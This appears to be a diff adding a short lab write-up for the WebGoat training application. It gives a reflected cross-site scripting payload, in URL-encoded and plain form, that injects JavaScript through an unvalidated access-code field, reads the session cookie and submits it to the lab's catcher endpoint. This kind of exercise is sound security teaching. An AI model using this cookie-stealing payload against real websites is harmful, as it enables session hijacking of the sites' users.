@@ -1,0 +1,17 @@
+<--
+The name field1 "Enter your three digit access code:" is vulnerable. 
+The exploit script is as shown below
+-->
+
+URL: http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=%3Cscript%3E%0D%0A%09var+cookie+%3D+document.cookie%3B%0D%0A%09var+cookieArray+%3D+cookie.split%28%22%3D%22%29%3B%0D%0A%09document.forms%5B0%5D.action+%3D+%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26cookie%3D%22+%2B+cookieArray%5B1%5D%3B%0D%0A%09document.forms%5B0%5D.submit%28%29%3B%0D%0A%3C%2Fscript%3E
+
+Unencoded URL (script part):
+<script>
+	var cookie = document.cookie;
+	var cookieArray = cookie.split("=");
+	document.forms[0].action = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&cookie=" + cookieArray[1];
+	document.forms[0].submit();
+</script>
+
+The attacker will use the vulnerable field to inject some javascript into the page and using the javascript to get the cookie.
+The attacker was able to conduct the attack this way is becuase the field "Enter your three digit access code" does not have any input validation.
